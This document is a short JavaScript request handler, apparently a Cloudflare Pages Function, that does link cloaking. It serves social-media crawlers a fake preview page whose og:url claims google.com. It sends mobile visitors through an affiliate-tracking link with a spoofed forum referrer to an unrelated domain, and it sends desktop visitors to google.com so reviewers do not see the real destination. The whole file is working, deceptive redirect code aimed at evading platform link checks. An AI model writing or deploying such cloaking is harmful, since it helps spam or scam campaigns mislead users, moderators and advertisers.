export async function onRequest(context) {
  const request = context.request;
  const userAgent = request.headers.get('user-agent') || '';

  // 1. Check for Social Media Crawlers / Bots
  const isSocialBot = /facebookexternalhit|Facebot|Twitterbot|Pinterest|LinkedInBot|WhatsApp|TelegramBot/i.test(userAgent);

  if (isSocialBot) {
    const htmlContent = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome</title>
    <meta property="og:title" content="🩷❤️❤️🩷">
    <meta property="og:description" content="">
    <meta property="og:image" content="https://super-duper-disco.pages.dev/3.jpg">
    <meta property="og:url" content="https://www.google.com">
    <meta property="og:type" content="website">
</head>
<body>
</body>
</html>`;

    return new Response(htmlContent, {
      headers: { 'content-type': 'text/html;charset=UTF-8' },
    });
  }

  // 2. Check for Mobile Users
  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);

  if (isMobile) {
    return Response.redirect("https://go.skimresources.com/?id=130832X1595857&isjs=1&jv=15.7.1&sref=https%3A%2F%2Fwww.gminsidenews.com%2Fthreads%2Fnew-cadillac-ct5-new-buick-sedan-possible-new-camaro-what-if.311557%2F&url=https%3A%2F%2Facorntar.com%2Fmxxcdagb%3Fkey%3De6e8236c6980d94ca8e81d0b03ea93df&xs=1&xtz=-300&xuuid=0572dc460daa2935e24d2db682e9c97d&xjsf=other_click__auxclick%20%5B2%5D", 302);
  } else {
    return Response.redirect("https://www.google.com", 302);
  }
}
